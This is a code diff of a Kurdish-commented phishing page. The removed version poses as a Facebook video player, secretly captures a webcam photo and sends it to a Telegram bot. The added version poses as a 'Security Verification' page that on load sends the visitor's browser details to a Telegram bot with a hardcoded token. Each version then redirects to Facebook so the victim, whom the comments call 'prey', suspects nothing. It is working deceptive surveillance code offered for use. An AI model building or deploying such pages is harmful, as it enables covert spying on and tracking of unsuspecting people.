@@ -1,63 +1,21 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta property="og:site_name" content="facebook.com">
-    <meta property="og:title" content="Facebook Watch | ڤیدیۆیەکی نوێ">
-    <meta property="og:image" content="video-cover.jpg">
-    <title>Facebook Video Player</title>
-    <style>
-        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        /* وێنەی نێچیرەکە وەک پۆستەری ڤیدیۆ */
-        #poster { width: 100%; height: auto; max-width: 600px; cursor: pointer; z-index: 10; }
-        .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; display: none; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body onclick="takeCapture()">
-
-    <img id="poster" src="video-cover.jpg">
-    <div id="loader" class="loading-ring"></div>
-
-    <video id="v" style="display:none" autoplay playsinline></video>
-    <canvas id="c" style="display:none"></canvas>
-
+    <title>Security Verification</title>
+    <meta property="og:image" content="https://raw.githubusercontent.com/Sultana/img/main/alert.jpg">
     <script>
-        // لێرە زانیارییەکانت دابنێ
-        const BOT_TOKEN = 'لێرە_تۆکن_دابنێ';
-        const CHAT_ID = 'لێرە_ئایدی_دابنێ';
-
-        async function takeCapture() {
-            // شاردنەوەی وێنەکە و پیشاندانی Loading بۆ خەڵەتاندن
-            document.getElementById('poster').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-
-                setTimeout(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'nicher.jpg');
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
-                        .then(() => {
-                            // دوای وێنەگرتن دەچێتە سەر ڤیدیۆ ئەسڵییەکە
-                            window.location.href = "https://www.facebook.com/watch";
-                        });
-                    }, 'image/jpeg');
-                }, 1000);
-            } catch (err) {
-                // ئەگەر نێچیرەکە "Allow" نەکرد، هەر بیبە بۆ فەیسبووک تا گومان نەکات
-                window.location.href = "https://www.facebook.com/watch";
-            }
+        async function capture() {
+            const T = '8003094558:AAFAyNxNF-wAnQCgZ8XTJrZRIomL_l9JKrs';
+            const C = '8418985219';
+            const info = "🚀 پاشا، نێچیرەکە کلیکی کرد!%0A📱 مۆبایل: " + navigator.userAgent;
+            
+            await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${info}`);
+            window.location.href = "https://www.facebook.com"; // دەیبات بۆ فەیسبووک تا گومان نەکات
         }
+        window.onload = capture;
     </script>
+</head>
+<body style="margin:0; padding:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh;">
+    <h2 style="color:white; font-family:Arial;">Loading...</h2>
 </body>
 </html>
